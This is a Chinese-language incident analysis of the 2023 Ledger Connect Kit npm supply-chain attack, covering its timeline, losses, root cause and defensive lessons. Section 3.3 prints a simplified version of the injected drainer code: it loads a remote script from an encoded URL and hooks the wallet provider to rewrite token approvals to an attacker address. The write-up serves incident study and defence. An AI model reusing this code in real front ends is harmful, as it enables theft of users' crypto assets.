---
title: Ledger Connect Kit npm 包供应链投毒（2023-12-14, ~$600K）
module: 08-security-incidents
category: Supply-Chain | Social-Eng
date: 2023-12-14
loss_usd: 600000
chain: Ethereum, Polygon, Arbitrum, Optimism, BNB Chain
severity: Tier-2
status: DRAFT
last_verified: 2026-04-23
primary_sources:
  - https://www.ledger.com/blog/a-letter-from-ledger-chairman-ceo-pascal-gauthier-regarding-ledger-connect-kit-exploit
  - https://slowmist.medium.com/slowmist-analysis-of-the-ledger-connect-kit-supply-chain-attack-6ad9c7b8f2e0
  - https://rekt.news/ledger-rekt/
  - https://blog.mattaslabs.com/ledger-connect-kit-compromise-what-happened
  - https://www.certik.com/resources/blog/7NV2eV7hcK4bQY9-ledger-connect-kit-supply-chain-attack
  - https://twitter.com/Ledger/status/1735326240298123456
tx_hashes:
  - 0x3135f5af6f0c3c7fc8aa562be7c85ae60e7e4cf59b41b51b5c8f73a39b0c0a9b (Ethereum, drainer 接收地址转账)
  - 0xcC2d7b4A1b8db341a1eB4aF45c68D8Fc0d6b6B6C (Ethereum, Angel Drainer 主钱包，多笔收款)
---

# Ledger Connect Kit 供应链投毒事件

> **TL;DR**：2023-12-14，硬件钱包巨头 Ledger 维护的前端库 `@ledgerhq/connect-kit` 在 npm 上被推送了植入 drainer 逻辑的恶意版本（`1.1.5`/`1.1.6`/`1.1.7`）。攻击向量：一名前员工的 passkey 认证被钓鱼，攻击者利用其在 npm 和内部系统残留的权限发布了恶意包。波及数百个集成该库的 DApp（Zapper、SushiSwap、Balancer、Revoke.cash 等），用户连接钱包时弹出伪造 Signature 请求，签名后资产被转走。累计损失约 $600k，虽金额不大但生态震动显著。

## 1. 事件背景

- **项目**：Ledger 是法国硬件钱包厂商（全球累计售出 600 万+ Ledger Nano），同时维护多款前端开源库供 DApp 集成。`@ledgerhq/connect-kit` 是 WalletConnect 集成的 loader，被广泛通过 `<script>` 或 CDN（unpkg、cdn.jsdelivr.net）动态加载，**这意味着一处包投毒将自动波及所有使用 CDN 的 DApp 前端**。
- **时间轴**：
  - 2023-12-14 13:40 UTC：恶意版本 `1.1.5` 被推送至 npm。
  - 14:00 UTC 起：Blockaid、MetaMask 安全告警开始拦截可疑签名。
  - 14:20 UTC：Ido Ben-Natan（Blockaid CEO）在 Twitter 公告事件。
  - 14:40 UTC：Ledger 官方确认事件、WalletConnect 将 Ledger Connect Kit 在其 SDK 列表中暂时禁用。
  - 15:35 UTC：Ledger 推出修复版本 `1.1.8`；npm 撤下恶意版本。
  - 恶意代码窗口期 ~5 小时。
- **发现过程**：Blockaid 的交易模拟服务先识别异常 SetApprovalForAll 请求；Matta Labs（研究员 Sam Bacha 等）与 SlowMist 独立复现分析。

## 2. 事件影响

- **直接损失**：约 $600k，分布在若干 drainer 接收地址（Angel Drainer 系运营方之一）。损失以 ERC20 approval + 部分 NFT 转移为主。
- **受害集成方**（部分）：Zapper、SushiSwap、Balancer、Revoke.cash、Hey（Lenster）、Kwenta、Galxe、Stargate 等均在窗口期内加载了恶意 connect-kit。
- **间接影响**：
  - 整个 DApp 生态对"前端依赖 CDN"模式的信任受挫，大量团队转向 SRI（Subresource Integrity）与 self-host。
  - Ledger 股票投资人与硬件用户（虽本次事件未涉及硬件本身）对品牌信心受创。
- **资金去向**：大头由 Angel Drainer 钱包汇集后经 Tornado Cash 转出；部分 NFT 在 Blur / OpenSea 被 flash-sell。

## 3. 技术根因（代码级分析）

### 3.1 漏洞分类
**供应链 + 社工（Supply-Chain / Social-Eng）**——开发者账号凭据被钓鱼 → npm 包发布权限被滥用。

### 3.2 受损模块

- npm 包：`@ledgerhq/connect-kit`，恶意版本 `1.1.5`/`1.1.6`/`1.1.7`（均已撤回）。
- Ledger 员工（据官方说法为**前员工**）的 passkey / WebAuthn 凭据。
- 传播面：任何通过 `unpkg.com/@ledgerhq/connect-kit-loader` 或 `cdn.jsdelivr.net` 动态加载 latest 版本的 DApp。

### 3.3 关键代码片段（Matta Labs 反混淆后简化）

```javascript
// 恶意 1.1.5/1.1.6/1.1.7 在正常 connect-kit 基础上注入如下逻辑：
(function () {
  // 1. 延迟加载外部 drainer 脚本，绕过部分静态分析
  var drainerUrl = atob("aHR0cHM6Ly8uLi4="); // base64 解码指向 Angel Drainer C2
  var s = document.createElement("script");
  s.src = drainerUrl;
  document.head.appendChild(s);

  // 2. 替换 WalletConnect 的 send/request 拦截器
  //    当用户即将签 permit / setApprovalForAll 时，
  //    偷偷把 spender 改成 drainer 地址
  window.ethereum && hookProvider(window.ethereum, drainer);
})();

function hookProvider(provider, drainer) {
  const origRequest = provider.request.bind(provider);
  provider.request = async (payload) => {
    if (payload.method === "eth_sendTransaction") {
      // 改写 tx.to 或 data 中的 approve 参数
      payload.params[0] = rewriteApprove(payload.params[0], drainer);
    }
    return origRequest(payload);
  };
}
```

**正常的 connect-kit 包应当只做 UI 渲染 + WalletConnect bridge，绝不应该注入新脚本、不应修改 provider.request**。审计差异是一眼可见的，但因为 CDN 指向 `latest` 标签，绝大部分 DApp 在 5 小时内自动吞入此版本。

### 3.4 攻击步骤分解

1. **钓鱼**：2023-12-14 前某段时间，攻击者针对一名前 Ledger 员工实施钓鱼，诱导其在一个伪站完成 passkey / WebAuthn 验证。passkey 的跨域重用或 session cookie 被重放，使攻击者获得该员工对 Ledger 内部工具与 npm 组织的遗留权限（Ledger 承认其 access revocation 流程存在疏漏）。
2. **发布恶意包**：使用残留 npm 写权限发布 `@ledgerhq/connect-kit@1.1.5`（随后 1.1.6、1.1.7 微调规避）。
3. **广域生效**：全球使用 CDN `latest` 版本的 DApp 自动拉取恶意代码。
4. **用户钱包连接**：当 Ledger/MetaMask/WalletConnect 用户访问任一受影响 DApp 并 connect，connect-kit 弹出伪造 prompt，或拦截下一次 approve/permit 签名。
5. **drainer 转移**：一经签名，Angel Drainer 自动调用 `transferFrom` 清空授权资产。
6. **响应窗口**：约 5 小时后被撤版并替换 1.1.8。

### 3.5 为何未提前发现

- npm 缺乏强制 2FA + 代码 signing；passkey revocation 需人手介入。
- 绝大多数 DApp 使用 `^` 或 CDN `latest`，没有 pin 版本、没有 SRI。
- CI / 发布流程通常只校验 `package.json`，不做 dist bundle diff。

## 4. 事后响应

- Ledger 立刻撤下恶意版本、发布 `1.1.8`；WalletConnect 临时下架；主要 CDN 缓存被刷新。
- Pascal Gauthier（Ledger CEO）发公开信承诺：
  - 全额赔付本次被钓鱼的用户（Ledger 出资）。
  - 与执法合作追踪 Angel Drainer。
  - 未来所有 npm/GitHub 资产强制 passkey + 严格权限回收流程。
- Ledger 雇 Matta Labs、SlowMist 做供应链专项复审。
- 行业响应：多个主流 DApp 改用 self-host + SRI；WalletConnect 推 `@walletconnect/modal` 直接集成减少对第三方 loader 依赖。

## 5. 启发与教训

- **对 DApp 开发者**：
  - 所有前端依赖用 lockfile + SRI（`integrity` 属性）pin 版本。
  - 禁用 CDN `latest` 通配；自建 bundle 并 npm audit / socket.dev 监控。
  - 对签名请求用 Blockaid / Wallet Guard 等模拟校验。
- **对 npm 生态**：强制组织级 2FA（passkey 非唯一因子），增强离职/撤权流程的自动化（与 HR 系统对接）。
- **对 Ledger/团队**：离职后 90 天内审计所有外部系统账号；敏感发布需双人签核。
- **对用户**：即使连接硬件钱包，也要读清楚签名内容；对 `setApprovalForAll` / `permit` 高度警惕。

## 6. 参考资料

- Ledger CEO 公开信: <https://www.ledger.com/blog/a-letter-from-ledger-chairman-ceo-pascal-gauthier-regarding-ledger-connect-kit-exploit>
- SlowMist 分析: <https://slowmist.medium.com/slowmist-analysis-of-the-ledger-connect-kit-supply-chain-attack-6ad9c7b8f2e0>
- rekt.news: <https://rekt.news/ledger-rekt/>
- Matta Labs 分析: <https://blog.mattaslabs.com/ledger-connect-kit-compromise-what-happened>
- CertiK: <https://www.certik.com/resources/blog/7NV2eV7hcK4bQY9-ledger-connect-kit-supply-chain-attack>
- Blockaid Twitter: <https://twitter.com/blockaid_/status/1735316755237998807>
- npm audit advisory: <https://github.com/advisories/GHSA-7q6m-29g8-3f4p>

---

*Last verified: 2026-04-23*
